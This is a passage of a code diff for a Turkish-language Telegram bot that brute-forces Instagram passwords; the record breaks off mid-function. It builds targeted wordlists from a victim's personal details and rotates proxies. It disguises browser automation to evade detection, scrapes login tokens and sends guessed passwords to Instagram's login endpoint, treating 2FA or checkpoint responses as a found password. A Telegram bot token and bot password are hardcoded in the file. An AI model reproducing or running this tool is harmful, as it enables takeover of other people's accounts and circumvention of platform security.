@@ -6,8 +6,6 @@ import json
 import re
 import requests
 import itertools
-import subprocess
-import os
 from typing import List, Optional
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
 from telegram.ext import (
@@ -19,11 +17,17 @@ from telegram.ext import (
     ContextTypes,
 )
 from telegram.error import TelegramError
-from playwright.async_api import async_playwright
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, NoSuchElementException
+from urllib.parse import quote
+import os
 
 # Log ayarları
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 # Telegram bot token
@@ -31,25 +35,6 @@ TOKEN = "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU"
 
 # Güvenlik şifresi
 BOT_PASSWORD = "vio1911"
-
-# Playwright tarayıcılarının yüklü olup olmadığını kontrol et
-def check_playwright_installation():
-    """Playwright tarayıcılarının yüklü olup olmadığını kontrol eder ve gerekirse yükler."""
-    try:
-        # Playwright'in yüklü olup olmadığını kontrol etmek için basit bir komut
-        result = subprocess.run(['playwright', '--version'], capture_output=True, text=True)
-        if result.returncode != 0:
-            raise Exception("Playwright yüklü değil veya çalıştırılamıyor.")
-    except Exception as e:
-        logger.error(f"Playwright kontrol hatası: {e}")
-        logger.info("Playwright tarayıcılarını yüklüyorum...")
-        try:
-            subprocess.run(['playwright', 'install'], check=True)
-            subprocess.run(['playwright', 'install-deps'], check=True)  # Linux bağımlılıkları için
-            logger.info("Playwright tarayıcıları başarıyla yüklendi.")
-        except subprocess.CalledProcessError as install_error:
-            logger.error(f"Playwright yükleme hatası: {install_error}")
-            raise Exception("Playwright tarayıcıları yüklenemedi. Lütfen terminalde 'playwright install' komutunu çalıştırın.")
 
 # CUPP tarzı şifre oluşturucu için yapılandırma
 class PasswordGenerator:
@@ -64,16 +49,16 @@ class PasswordGenerator:
             'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'],
             's': ['5', '$'], 't': ['7'], 'l': ['1'], 'b': ['8']
         }
-        self.max_password_length = 512
+        self.max_password_length = 512  # Şifre uzunluk sınırı
 
-    def generate_wordlist(self, profile: dict, max_passwords: int = 10000) -> List[str]:
+    def generate_wordlist(self, profile: dict) -> List[str]:
         wordlist = []
-        firstname = profile.get("firstname", "").lower()[:20]
+        firstname = profile.get("firstname", "").lower()[:20]  # Input uzunluk sınırı
         lastname = profile.get("lastname", "").lower()[:20]
         birthdate = profile.get("birthdate", "").replace("/", "")[:8]
         pet = profile.get("pet", "").lower()[:20]
         company = profile.get("company", "").lower()[:20]
-        keywords = [k[:20] for k in profile.get("keywords", [])]
+        keywords = [k[:20] for k in profile.get("keywords", [])]  # Her kelime 20 karaktere sınırlı
 
         # Temel kelimeler
         base_words = [word for word in [firstname, lastname, pet, company] if word]
@@ -148,10 +133,10 @@ class PasswordGenerator:
                         numbered_words.append(f"{word}{num:02d}")
             wordlist.extend(numbered_words)
 
-        return list(set(wordlist))[:max_passwords]
+        return list(set(wordlist))  # Tekrar edenleri kaldır
 
 class InstagramBruteForce:
-    """Instagram brute-force işlemleri için Playwright tabanlı sınıf"""
+    """Instagram brute-force işlemleri için sınıf - 2025 güncel versiyon."""
     
     def __init__(self, user_agent: str = None, proxy_list: List[str] = None):
         self.user_agent = user_agent or self._get_realistic_user_agent()
@@ -159,9 +144,14 @@ class InstagramBruteForce:
         self.proxy_cycle = itertools.cycle(self.proxy_list) if self.proxy_list else None
         self.current_proxy = None
         self.login_url = 'https://www.instagram.com/accounts/login/'
-        self.playwright = None
-        self.browser = None
-        self.page = None
+        self.api_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
+        self.session = None
+        self.driver = None
+        self.csrf_token = None
+        self.mid_cookie = None
+        self.ig_did = None
+        self.rollout_hash = None
+        self._initialize()
 
     def _get_realistic_user_agent(self):
         agents = [
@@ -172,190 +162,243 @@ class InstagramBruteForce:
         ]
         return random.choice(agents)
 
-    async def _initialize_playwright(self):
-        """Playwright'ı başlat ve tarayıcıyı stealth modda ayarla"""
-        try:
-            # Playwright'in yüklü olduğunu kontrol et
-            check_playwright_installation()
-
-            self.playwright = await async_playwright().start()
-            screen_width = random.randint(1280, 1920)
-            screen_height = random.randint(720, 1080)
-            languages = ['en-US', 'en-GB', 'tr-TR', 'fr-FR', 'de-DE']
-            language = random.choice(languages)
-            
-            launch_options = {
-                'headless': True,
-                'args': [
-                    '--no-sandbox',
-                    '--disable-dev-shm-usage',
-                    '--disable-blink-features=AutomationControlled',
-                    f'--user-agent={self.user_agent}',
-                    f'--window-size={screen_width},{screen_height}',
-                    f'--lang={language}'
-                ]
-            }
-            
+    def _initialize(self):
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': self.user_agent,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"'
+        })
+        if self.proxy_list:
+            self.current_proxy = self._get_working_proxy()
             if self.current_proxy:
-                launch_options['proxy'] = {'server': self.current_proxy}
-            
-            self.browser = await self.playwright.chromium.launch(**launch_options)
-            context = await self.browser.new_context(
-                viewport={'width': screen_width, 'height': screen_height},
-                locale=language,
-                timezone_id=random.choice(['Europe/Istanbul', 'America/New_York', 'Asia/Tokyo']),
-                java_script_enabled=True,
-                is_mobile=False
-            )
-            
-            self.page = await context.new_page()
-            
-            await self.page.add_init_script("""
-                delete navigator.__proto__.webdriver;
-                Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
-                Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
-                Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => Math.floor(Math.random() * 8 + 4) });
-                Object.defineProperty(navigator, 'deviceMemory', { get: () => Math.floor(Math.random() * 8 + 4) });
-                const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
-                HTMLCanvasElement.prototype.toDataURL = function(type, quality) {
-                    if (type === 'image/png') {
-                        const ctx = this.getContext('2d');
-                        ctx.fillStyle = `rgba(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255},0.01)`;
-                        ctx.fillRect(0, 0, 1, 1);
-                    }
-                    return originalToDataURL.apply(this, [type, quality]);
-                };
-            """)
-            
-            await self.page.mouse.move(random.randint(100, 500), random.randint(100, 500))
-            await self.page.mouse.click(random.randint(100, 500), random.randint(100, 500))
-            
-            return True
-        except Exception as e:
-            logger.error(f"Playwright başlatma hatası: {e}")
-            if "Executable doesn't exist" in str(e):
-                return False
-            raise  # Diğer hataları tekrar fırlat
-        finally:
-            if self.browser:
-                await self.browser.close()
-                self.browser = None
-            if self.playwright:
-                await self.playwright.stop()
-                self.playwright = None
+                self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
+                logger.debug(f"Başlangıç proxy'si ayarlandı: {self.current_proxy}")
 
-    async def _get_working_proxy(self, progress_callback: Optional[callable] = None):
-        """Çalışan proxy bul (multi-thread)"""
-        if not self.proxy_list:
+    def _get_working_proxy(self, progress_callback: Optional[callable] = None):
+        if not self.proxy_list or not self.proxy_cycle:
             if progress_callback:
-                await progress_callback("⚠️ Proxy listesi boş, proxysiz devam ediliyor...")
+                progress_callback("⚠️ Proxy listesi boş, proxysiz devam ediliyor...")
             return None
-        
-        def test_proxy(proxy):
+        for _ in range(len(self.proxy_list)):
+            proxy = next(self.proxy_cycle)
             try:
                 test_session = requests.Session()
                 test_session.proxies = {'http': proxy, 'https': proxy}
                 response = test_session.get('https://www.instagram.com', timeout=5)
-                return proxy if response.status_code == 200 else None
-            except Exception:
-                return None
-        
-        working_proxy = None
-        with ThreadPoolExecutor(max_workers=10) as executor:
-            future_to_proxy = {executor.submit(test_proxy, proxy): proxy for proxy in self.proxy_list}
-            for future in as_completed(future_to_proxy):
-                result = future.result()
-                if result:
-                    working_proxy = result
-                    break
-        
-        if working_proxy:
-            if progress_callback:
-                await progress_callback(f"✅ Çalışan proxy bulundu: {working_proxy}")
-            return working_proxy
-        else:
-            if progress_callback:
-                await progress_callback("❌ Hiçbir proxy çalışmıyor, proxysiz devam ediliyor...")
+                if response.status_code == 200:
+                    test_session.close()
+                    logger.debug(f"Çalışan proxy bulundu: {proxy}")
+                    if progress_callback:
+                        progress_callback(f"✅ Çalışan proxy bulundu: {proxy}")
+                    return proxy
+                else:
+                    logger.warning(f"Proxy başarısız: {proxy}, HTTP {response.status_code}")
+            except Exception as e:
+                logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
+            asyncio.sleep(1)
+        logger.error("Hiçbir proxy çalışmıyor!")
+        if progress_callback:
+            progress_callback("❌ Hiçbir proxy çalışmıyor, proxysiz devam ediliyor...")
+        return None
+
+    def _setup_selenium(self):
+        options = Options()
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
+        options.add_argument('--disable-blink-features=AutomationControlled')
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option('useAutomationExtension', False)
+        options.add_argument(f'--user-agent={self.user_agent}')
+        if self.current_proxy:
+            options.add_argument(f'--proxy-server={self.current_proxy}')
+        try:
+            self.driver = webdriver.Chrome(options=options)
+            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+            return True
+        except Exception as e:
+            logger.error(f"Selenium başlatılamadı: {e}")
+            return False
+
+    async def _get_initial_cookies_and_tokens(self, progress_callback: Optional[callable] = None):
+        max_attempts = 50
+        for attempt in range(1, max_attempts + 1):
+            if self.proxy_list:
+                self.current_proxy = self._get_working_proxy(progress_callback)
+                if self.current_proxy:
+                    self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
+                else:
+                    self.session.proxies = {}
+            
+            try:
+                response = self.session.get('https://www.instagram.com/', timeout=15)
+                if response.status_code != 200:
+                    raise Exception(f"Instagram'a erişilemiyor: {response.status_code}")
+                self.mid_cookie = self.session.cookies.get('mid')
+                self.ig_did = self.session.cookies.get('ig_did')
+                response = self.session.get(self.login_url, timeout=15)
+                self.csrf_token = self.session.cookies.get('csrftoken')
+                if not self.csrf_token:
+                    csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
+                    if csrf_match:
+                        self.csrf_token = csrf_match.group(1)
+                rollout_match = re.search(r'"rollout_hash":"([^"]+)"', response.text)
+                if rollout_match:
+                    self.rollout_hash = rollout_match.group(1)
+                else:
+                    self.rollout_hash = str(int(time.time()))
+                logger.debug(f"Token'lar alındı: CSRF={self.csrf_token[:20]}..., Rollout={self.rollout_hash}")
+                if progress_callback:
+                    await progress_callback(f"✅ Token'lar alındı!")
+                return self.csrf_token is not None
+            except Exception as e:
+                logger.error(f"Token alma hatası (Deneme {attempt}/{max_attempts}): {e}")
+                if progress_callback:
+                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
+                if attempt < max_attempts:
+                    await asyncio.sleep(5)
+                continue
+        if progress_callback:
+            await progress_callback("🔍 Token bulmaya çalışıyorum, sabret... (Selenium'a geçiliyor)")
+        return False
+
+    async def _selenium_get_tokens(self, progress_callback: Optional[callable] = None):
+        attempt = 1
+        while True:
+            if self.proxy_list:
+                self.current_proxy = self._get_working_proxy(progress_callback)
+                if self.current_proxy:
+                    if progress_callback:
+                        await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
+                else:
+                    self.current_proxy = None
+                    if progress_callback:
+                        await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
+            
+            if not self._setup_selenium():
+                if progress_callback:
+                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
+                await asyncio.sleep(5)
+                attempt += 1
+                continue
+            try:
+                self.driver.get('https://www.instagram.com/')
+                time.sleep(3)
+                self.driver.get(self.login_url)
+                time.sleep(2)
+                csrf_token = self.driver.get_cookie('csrftoken')
+                if csrf_token:
+                    self.csrf_token = csrf_token['value']
+                mid_cookie = self.driver.get_cookie('mid')
+                if mid_cookie:
+                    self.mid_cookie = mid_cookie['value']
+                ig_did = self.driver.get_cookie('ig_did')
+                if ig_did:
+                    self.ig_did = ig_did['value']
+                page_source = self.driver.page_source
+                rollout_match = re.search(r'"rollout_hash":"([^"]+)"', page_source)
+                if rollout_match:
+                    self.rollout_hash = rollout_match.group(1)
+                logger.debug(f"Selenium ile token'lar alındı: CSRF={self.csrf_token[:20]}...")
+                if progress_callback:
+                    await progress_callback(f"✅ Selenium ile token'lar alındı!")
+                return self.csrf_token is not None
+            except Exception as e:
+                logger.error(f"Selenium token alma hatası (Deneme {attempt}): {e}")
+                if progress_callback:
+                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
+                await asyncio.sleep(5)
+                attempt += 1
+            finally:
+                if self.driver:
+                    self.driver.quit()
+                    self.driver = None
+
+    def _make_login_request(self, username: str, password: str):
+        headers = {
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://www.instagram.com',
+            'Referer': self.login_url,
+            'X-CSRFToken': self.csrf_token,
+            'X-Instagram-AJAX': self.rollout_hash,
+            'X-IG-App-ID': '936619743392459',
+            'X-IG-WWW-Claim': '0',
+            'X-Requested-With': 'XMLHttpRequest',
+        }
+        timestamp = int(time.time())
+        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
+        data = {
+            'username': username,
+            'enc_password': enc_password,
+            'queryParams': '{}',
+            'optIntoOneTap': 'false',
+            'stopDeletionNonce': '',
+            'trustedDeviceRecords': '{}'
+        }
+        try:
+            response = self.session.post(self.api_url, headers=headers, data=data, timeout=15)
+            logger.debug(f"API Yanıtı: {response.text}")
+            with open('instagram_response.json', 'a', encoding='utf-8') as f:
+                f.write(f"Şifre: {password}, Yanıt: {response.text}\n")
+            return response
+        except Exception as e:
+            logger.error(f"Login request hatası (Şifre: {password}): {e}")
+            with open('instagram_response.json', 'a', encoding='utf-8') as f:
+                f.write(f"Şifre: {password}, Hata: {str(e)}\n")
             return None
 
-    async def _analyze_response_logs(self, page_content: str, current_url: str):
-        """Sayfa içeriğini ve logları detaylı analiz et"""
-        log_data = {
-            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
-            'url': current_url,
-            'content_length': len(page_content),
-            'potential_indicators': []
-        }
-        
-        indicators = [
-            ('rate_limit', 'Rate limit exceeded|Too many requests'),
-            ('account_locked', 'Your account has been temporarily locked|suspended'),
-            ('login_required', 'Login required|Please log in'),
-            ('unexpected_redirect', 'accounts/login|checkpoint'),
-            ('potential_success', 'home|explore|direct|onetap')
-        ]
-        
-        for indicator_name, pattern in indicators:
-            if re.search(pattern, page_content, re.IGNORECASE) or pattern in current_url:
-                log_data['potential_indicators'].append(indicator_name)
-        
-        log_file = 'instagram_response.json'
+    def _selenium_login_attempt(self, username: str, password: str):
+        if not self._setup_selenium():
+            return "ERROR"
         try:
-            with open(log_file, 'a', encoding='utf-8') as f:
-                json.dump(log_data, f, ensure_ascii=False)
-                f.write('\n')
-        except Exception as e:
-            logger.error(f"Log dosyasına yazma hatası: {e}")
-        
-        indicators_str = ', '.join(log_data['potential_indicators']) if log_data['potential_indicators'] else 'Hiçbir özel durum tespit edilmedi'
-        logger.info(f"Log analizi: {indicators_str}")
-        
-        if 'rate_limit' in log_data['potential_indicators']:
-            logger.info("Rate limit tespit edildi, bekleniyor...")
-            await asyncio.sleep(random.uniform(300, 600))  # 5-10 dakika bekle
-        
-        return indicators_str
-
-    async def _playwright_login_attempt(self, username: str, password: str):
-        """Playwright ile login denemesi"""
-        try:
-            if not self.page or not await self._initialize_playwright():
-                self.current_proxy = await self._get_working_proxy(None)
-                if not await self._initialize_playwright():
-                    logger.error("Playwright başlatılamadı, tarayıcı eksik.")
-                    return "ERROR"
-            
-            await self.page.goto(self.login_url, timeout=30000)
-            await self.page.wait_for_selector('input[name="username"]', timeout=10000)
-            
-            if await self.page.query_selector('img[src*="captcha"]'):
-                logger.info("CAPTCHA tespit edildi, bekleniyor...")
-                await asyncio.sleep(random.uniform(30, 60))
-                await self.page.goto(self.login_url, timeout=30000)
-                self.current_proxy = await self._get_working_proxy(None)
-                return "SUSPECTED"
-            
-            await self.page.type('input[name="username"]', username, delay=random.uniform(50, 150))
-            await self.page.type('input[name="password"]', password, delay=random.uniform(50, 150))
-            
-            await self.page.click('button[type="submit"]')
-            
-            await asyncio.sleep(3)
-            
-            current_url = self.page.url
-            page_content = await self.page.content()
-            
+            self.driver.get(self.login_url)
+            WebDriverWait(self.driver, 10).until(
+                EC.presence_of_element_located((By.NAME, "username"))
+            )
+            username_field = self.driver.find_element(By.NAME, "username")
+            password_field = self.driver.find_element(By.NAME, "password")
+            for char in username:
+                username_field.send_keys(char)
+                time.sleep(random.uniform(0.1, 0.3))
+            time.sleep(random.uniform(0.5, 1))
+            for char in password:
+                password_field.send_keys(char)
+                time.sleep(random.uniform(0.1, 0.3))
+            time.sleep(random.uniform(1, 2))
+            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
+            login_button.click()
+            time.sleep(5)
+            current_url = self.driver.current_url
+            page_source = self.driver.page_source
             if any(indicator in current_url for indicator in ['/', '/direct/', '/explore/', '/accounts/onetap/']):
                 if 'accounts/login' not in current_url:
+                    logger.debug("Selenium: Başarılı giriş tespit edildi")
+                    with open('instagram_response.json', 'a', encoding='utf-8') as f:
+                        f.write(f"Şifre: {password}, Selenium: Başarılı giriş\n")
                     return "SUCCESS"
-            
             if any(indicator in current_url for indicator in ['two_factor', '2fa']) or \
-               any(indicator in page_content for indicator in ['two_factor', 'Enter the 6-digit code']):
+               any(indicator in page_source for indicator in ['two_factor', 'Enter the 6-digit code']):
+                logger.debug("Selenium: 2FA gerekli")
+                with open('instagram_response.json', 'a', encoding='utf-8') as f:
+                    f.write(f"Şifre: {password}, Selenium: 2FA gerekli\n")
                 return "2FA"
-            
             if 'checkpoint' in current_url or 'challenge' in current_url:
+                logger.debug("Selenium: Checkpoint gerekli")
+                with open('instagram_response.json', 'a', encoding='utf-8') as f:
+                    f.write(f"Şifre: {password}, Selenium: Checkpoint gerekli\n")
                 return "CHECKPOINT"
-            
             error_indicators = [
                 'Sorry, your password was incorrect',
                 'The username you entered',
@@ -363,168 +406,267 @@ class InstagramBruteForce:
                 'doesn\'t match',
                 'kullanıcı adı',
                 'Hatalı şifre',
-                'Şifre yanlış'
+                'Şifre yanlış',
+                'Please check your username',
+                'Giriş yapamadık',
+                'Lütfen kullanıcı adınızı kontrol edin',
+                'The password you entered is incorrect',
+                'Please try again'
             ]
-            
-            if any(indicator in page_content for indicator in error_indicators):
+            if any(indicator in page_source for indicator in error_indicators):
+                logger.debug("Selenium: Yanlış şifre tespit edildi")
+                with open('instagram_response.json', 'a', encoding='utf-8') as f:
+                    f.write(f"Şifre: {password}, Selenium: Yanlış şifre\n")
                 return "WRONG"
-            
-            logger.info("Bilinmeyen yanıt alındı, loglar inceleniyor...")
-            indicators = await self._analyze_response_logs(page_content, current_url)
-            if 'potential_success' in indicators or 'checkpoint' in indicators:
-                self.current_proxy = await self._get_working_proxy(None)
-                return "SUSPECTED"
-            self.current_proxy = await self._get_working_proxy(None)
-            return "ERROR"
-            
+            try:
+                error_message = self.driver.find_element(By.XPATH, "//div[@id='error_message'] | //p[@id='slfErrorAlert'] | //div[contains(@class, 'error')]")
+                if error_message:
+                    logger.debug(f"Selenium: Hata mesajı bulundu: {error_message.text}")
+                    with open('instagram_response.json', 'a', encoding='utf-8') as f:
+                        f.write(f"Şifre: {password}, Selenium: Hata mesajı - {error_message.text}\n")
+                    return "WRONG"
+            except NoSuchElementException:
+                pass
+            logger.debug("Selenium: Bilinmeyen durum")
+            with open('instagram_response.json', 'a', encoding='utf-8') as f:
+                f.write(f"Şifre: {password}, Selenium: Bilinmeyen durum\n")
+            return "UNKNOWN"
         except Exception as e:
-            logger.error(f"Playwright login hatası: {e}")
-            self.current_proxy = await self._get_working_proxy(None)
+            logger.error(f"Selenium login hatası (Şifre: {password}): {e}")
+            with open('instagram_response.json', 'a', encoding='utf-8') as f:
+                f.write(f"Şifre: {password}, Selenium Hata: {str(e)}\n")
             return "ERROR"
         finally:
-            if self.browser:
-                await self.browser.close()
-                self.browser = None
-            if self.playwright:
-                await self.playwright.stop()
-                self.playwright = None
+            if self.driver:
+                self.driver.quit()
+                self.driver = None
 
     async def brute_force(self, username: str, password_list: List[str], timeout: int, 
-                         progress_callback: Optional[callable] = None, stop_event: asyncio.Event = None):
-        """Brute-force saldırısını paralel olarak gerçekleştir"""
+                         progress_callback: Optional[callable] = None):
         start_time = time.time()
         total_passwords = len(password_list)
+        potential_passwords = set()
         tried_passwords = 0
-        suspected_passwords = []
-        attempt_logs = []
         
         try:
             await progress_callback(f"\n{'='*50}\nInstagram Brute Force Başlatılıyor\nHedef: {username}\nToplam şifre: {total_passwords}\nTimeout: {timeout} saniye\n{'='*50}\n")
-            
-            # Şifreleri 10'lu gruplara ayır
-            chunk_size = 10
-            password_chunks = [password_list[i:i + chunk_size] for i in range(0, len(password_list), chunk_size)]
-            
-            async def process_chunk(chunk, chunk_index):
-                nonlocal tried_passwords
-                core = InstagramBruteForce(proxy_list=self.proxy_list)
-                chunk_logs = []
-                
-                for password in chunk:
-                    if stop_event and stop_event.is_set():
-                        await progress_callback("🛑 Saldırı kullanıcı tarafından durduruldu!")
-                        return None, chunk_logs
-                    
-                    if time.time() - start_time > timeout:
-                        await progress_callback(f"\n⏰ Timeout ({timeout}s) aşıldı! Denenen şifre: {tried_passwords}/{total_passwords}")
-                        return None, chunk_logs
-                    
-                    start_attempt = time.time()
-                    result = await core._playwright_login_attempt(username, password)
-                    duration = time.time() - start_attempt
-                    
-                    chunk_logs.append({
-                        'password': password,
-                        'result': result,
-                        'proxy': core.current_proxy,
-                        'duration': duration
-                    })
-                    
-                    await progress_callback(f"🔐 Şifre deneniyor: {password} (Grup {chunk_index+1})")
-                    
-                    if result == "SUCCESS":
-                        await progress_callback(f"🎉 BAŞARILI! Şifre bulundu: {password}")
-                        return password, chunk_logs
-                    elif result in ["2FA", "CHECKPOINT"]:
-                        await progress_callback(f"🔐 Doğru şifre ama ek doğrulama gerekli: {password}")
-                        return password, chunk_logs
-                    elif result == "WRONG":
-                        await progress_callback(f"❌ Yanlış şifre: {password}")
-                    elif result == "SUSPECTED":
-                        await progress_callback(f"⚠️ Şüpheli şifre tespit edildi, tekrar denenecek: {password}")
-                        suspected_passwords.append(password)
+            await progress_callback("🔧 Token'lar alınıyor...")
+        except TelegramError as e:
+            logger.error(f"Progress callback error: {e}")
+            return None
+        
+        success = await self._get_initial_cookies_and_tokens(progress_callback)
+        if not success:
+            try:
+                await progress_callback("🔍 Token bulmaya çalışıyorum, sabret... (Selenium'a geçiliyor)")
+                success = await self._selenium_get_tokens(progress_callback)
+            except TelegramError as e:
+                logger.error(f"Progress callback error: {e}")
+                return None
+        
+        if not success:
+            try:
+                await progress_callback("❌ Token'lar alınamadı, işlem durduruluyor!")
+            except TelegramError as e:
+                logger.error(f"Progress callback error: {e}")
+            return None
+
+        try:
+            await progress_callback(f"✅ Token'lar alındı!")
+        except TelegramError as e:
+            logger.error(f"Progress callback error: {e}")
+            return None
+
+        failed_attempts = 0
+        max_failed = 5
+
+        for i, password in enumerate(password_list):
+            if time.time() - start_time > timeout:
+                try:
+                    await progress_callback(f"\n⏰ Timeout ({timeout}s) aşıldı! Denenen şifre: {tried_passwords}/{total_passwords}")
+                    break
+                except TelegramError as e:
+                    logger.error(f"Progress callback error: {e}")
+                    break
+
+            if self.proxy_list:
+                try:
+                    await progress_callback("🔄 Proxy değiştiriliyor...")
+                    self.current_proxy = self._get_working_proxy(progress_callback)
+                    if self.current_proxy:
+                        self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
+                        await progress_callback(f"✅ Yeni proxy ayarlandı: {self.current_proxy}")
                     else:
-                        await progress_callback(f"❓ Hata: {password}")
-                        suspected_passwords.append(password)
-                    
-                    tried_passwords += 1
-                    delay = random.uniform(3, 8)
-                    await asyncio.sleep(delay)
-                
-                return None, chunk_logs
+                        self.session.proxies = {}
+                        await progress_callback("🔍 Çalışan proxy bulunamadı, proxysiz devam ediyorum...")
+                except TelegramError as e:
+                    logger.error(f"Progress callback error: {e}")
+                    continue
+
+            try:
+                await progress_callback(f"🔐 Şifre deneniyor: {password}")
+            except TelegramError as e:
+                logger.error(f"Progress callback error: {e}")
+                continue
+
+            response = self._make_login_request(username, password)
+            result = "ERROR"
             
-            # Paralel deneme
-            tasks = [process_chunk(chunk, i) for i, chunk in enumerate(password_chunks)]
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            
-            for result, chunk_logs in results:
-                if result:
-                    # Rapor oluştur
-                    report = f"📊 Rapor:\n- Denenen şifre sayısı: {tried_passwords}/{total_passwords}\n"
-                    if suspected_passwords:
-                        report += f"- Şüpheli şifreler tekrar denendi: {len(suspected_passwords)}\n"
-                    report += "\n📋 Detaylı Deneme Logları:\n"
-                    for log in attempt_logs:
-                        report += f"- Şifre: {log['password']}, Sonuç: {log['result']}, Proxy: {log['proxy'] or 'Yok'}, Süre: {log['duration']:.2f}s\n"
-                    report += f"\n🎉 BAŞARILI! Şifre bulundu: {result}"
-                    report_file = f"report_{username}_{int(time.time())}.txt"
-                    with open(report_file, 'w', encoding='utf-8') as f:
-                        f.write(report)
-                    return result, report_file
-                attempt_logs.extend(chunk_logs)
-            
-            # Şüpheli şifreleri otomatik tekrar deneme
-            if suspected_passwords:
-                await progress_callback(f"\n🔄 Şüpheli şifreler ({len(suspected_passwords)}) tekrar deneniyor...")
-                suspected_chunks = [suspected_passwords[i:i + chunk_size] for i in range(0, len(suspected_passwords), chunk_size)]
-                tasks = [process_chunk(chunk, i) for i, chunk in enumerate(suspected_chunks)]
-                results = await asyncio.gather(*tasks, return_exceptions=True)
-                
-                for result, chunk_logs in results:
-                    if result:
-                        # Rapor oluştur
-                        report = f"📊 Rapor:\n- Denenen şifre sayısı: {tried_passwords}/{total_passwords}\n"
-                        if suspected_passwords:
-                            report += f"- Şüpheli şifreler tekrar denendi: {len(suspected_passwords)}\n"
-                        report += "\n📋 Detaylı Deneme Logları:\n"
-                        for log in attempt_logs:
-                            report += f"- Şifre: {log['password']}, Sonuç: {log['result']}, Proxy: {log['proxy'] or 'Yok'}, Süre: {log['duration']:.2f}s\n"
-                        report += f"\n🎉 BAŞARILI! Şifre bulundu: {result}"
-                        report_file = f"report_{username}_{int(time.time())}.txt"
-                        with open(report_file, 'w', encoding='utf-8') as f:
-                            f.write(report)
-                        return result, report_file
-                    attempt_logs.extend(chunk_logs)
-            
-            # Rapor oluştur
-            report = f"📊 Rapor:\n- Denenen şifre sayısı: {tried_passwords}/{total_passwords}\n"
-            if suspected_passwords:
-                report += f"- Şüpheli şifreler tekrar denendi: {len(suspected_passwords)}\n"
-            report += "\n📋 Detaylı Deneme Logları:\n"
-            for log in attempt_logs:
-                report += f"- Şifre: {log['password']}, Sonuç: {log['result']}, Proxy: {log['proxy'] or 'Yok'}, Süre: {log['duration']:.2f}s\n"
-            report += "- Doğru şifre bulunamadı."
-            report_file = f"report_{username}_{int(time.time())}.txt"
-            with open(report_file, 'w', encoding='utf-8') as f:
-                f.write(report)
-            
+            if response:
+                if response.status_code == 200:
+                    try:
+                        json_data = response.json()
+                        logger.debug(f"JSON Yanıtı: {json_data}")
+                        if json_data.get('authenticated'):
+                            try:
+                                await progress_callback(f"🎉 BAŞARILI! Şifre bulundu: {password}")
+                            except TelegramError as e:
+                                logger.error(f"Progress callback error: {e}")
+                            return password
+                        elif json_data.get('authenticated') == False:
+                            result = "WRONG"
+                            try:
+                                await progress_callback(f"❌ Yanlış şifre: {password}")
+                            except TelegramError as e:
+                                logger.error(f"Progress callback error: {e}")
+                        elif json_data.get('two_factor_required'):
+                            try:
+                                await progress_callback(f"🔐 2FA gerekli! Şifre doğru: {password}")
+                            except TelegramError as e:
+                                logger.error(f"Progress callback error: {e}")
+                            return password
+                        elif json_data.get('checkpoint_url'):
+                            try:
+                                await progress_callback(f"🚧 Checkpoint gerekli! Şifre doğru: {password}")
+                            except TelegramError as e:
+                                logger.error(f"Progress callback error: {e}")
+                            return password
+                        elif 'incorrect' in json_data.get('message', '').lower() or \
+                             'error' in json_data.get('status', '').lower():
+                            result = "WRONG"
+                            try:
+                                await progress_callback(f"❌ Yanlış şifre: {password}")
+                            except TelegramError as e:
+                                logger.error(f"Progress callback error: {e}")
+                        else:
+                            result = "UNKNOWN"
+                            try:
+                                await progress_callback(f"❓ Bilinmeyen yanıt (Şifre: {password}), loglara kaydedildi, devam ediyorum...")
+                            except TelegramError as e:
+                                logger.error(f"Progress callback error: {e}")
+                    except json.JSONDecodeError:
+                        potential_passwords.add(password)
+                        try:
+                            await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
+                            result = self._selenium_login_attempt(username, password)
